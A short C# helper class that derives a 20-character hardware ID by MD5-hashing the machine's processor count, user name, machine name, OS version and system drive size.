using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Client.Helper;

public static class HwidGen
{
	public static string HWID()
	{
		try
		{
			return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
		}
		catch
		{
			return "Err HWID";
		}
	}

	public static string GetHash(string strToHash)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(strToHash);
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = bytes;
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString().Substring(0, 20).ToUpper();
	}
}
